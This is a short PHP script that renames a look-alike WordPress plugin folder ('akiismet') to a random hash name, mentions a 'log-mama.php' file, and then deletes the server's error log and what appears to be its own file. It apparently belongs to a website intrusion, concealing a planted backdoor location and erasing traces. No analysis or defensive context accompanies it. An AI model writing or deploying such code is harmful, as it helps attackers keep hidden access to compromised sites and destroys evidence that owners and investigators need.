<?php
$filedir = "../";
$str=rand();
$KONTOL1 = "akiismet";
$KONTOL2 = md5($str);
$oldname = $filedir.$KONTOL1;
$newname = $filedir.$KONTOL2;


if (rename($oldname, $newname)) {
	$message = sprintf(
		'The file %s was renamed to %s/log-mama.php successfully!',
		$oldname,
		$newname
	);
} else {
	$message = sprintf(
		'There was an error renaming file %s',
		$oldname
	);
}

echo $message;
unlink('error_log');
unlink('rand.php');